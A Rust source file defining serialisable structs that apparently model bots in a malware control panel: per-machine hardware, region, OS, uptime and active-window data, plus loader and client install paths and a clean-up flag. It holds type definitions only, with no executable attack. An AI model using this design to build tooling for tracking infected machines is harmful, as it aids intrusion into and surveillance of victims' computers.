use serde::{ Deserialize, Serialize };

#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
pub struct BotItem {
    pub id: String,
    pub flag: String,
    pub name: String,
    pub cpu_brand: String,
    pub ram: String,
    pub ping: String,
    pub join_date: String,
    pub system_boot_time: u64,
    pub region: String,
    pub os_info: String,
    pub active_window: String,
    // pub mib_config: Option<MibCnfg>,
    pub client_instances: Vec<FrontendClientInstance>,
    pub loader_instances: Vec<FrontendLoaderInstance>,
}

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
pub struct FrontendClientInstance {
    pub join_date: String,
    pub version: u64,
}
#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
pub struct FrontendLoaderInstance {
    pub join_date: String,
    pub version: u64,
    pub tag: String,
}

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
pub struct HstCnfg {
    pub version: u64,
    pub folder_path: String,
    pub exe_path: String,
    pub config_path: String,
}

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
pub struct MibCnfg {
    pub cln_up_done: bool,
    pub ldrs: Vec<HstCnfg>,
    pub clnts: Vec<HstCnfg>,
}
